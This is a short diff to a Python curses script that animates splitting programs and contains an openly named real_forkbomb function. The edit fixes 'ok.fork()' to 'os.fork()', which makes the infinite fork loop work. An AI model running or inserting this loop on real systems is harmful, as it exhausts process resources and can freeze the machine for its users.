@@ -1,10 +1,11 @@
 #!/usr/bin/env python
 
 import curses
+import os
 from random import choice, shuffle, randint
 from time import sleep
 from collections import namedtuple
-from math import log
+
 
 Program = namedtuple('Program',
                    ['x', 'y', 'x_min', 'x_max', 'y_min', 'y_max', 'next_split'])
@@ -91,7 +92,7 @@ def space_available(window, programs):
   for p in programs:
     if p.x in range(mx) and p.y in range(my):
       taken += 1
-  return taken < space * 0.35
+  return taken < space * 0.15
 
 def splitting_animation(window):
   my, mx = window.getmaxyx()
@@ -104,7 +105,7 @@ def splitting_animation(window):
 
 def real_forkbomb():
   while True:
-    ok.fork()
+    os.fork()
 
 def main(stdscr):
   curses.curs_set(False)
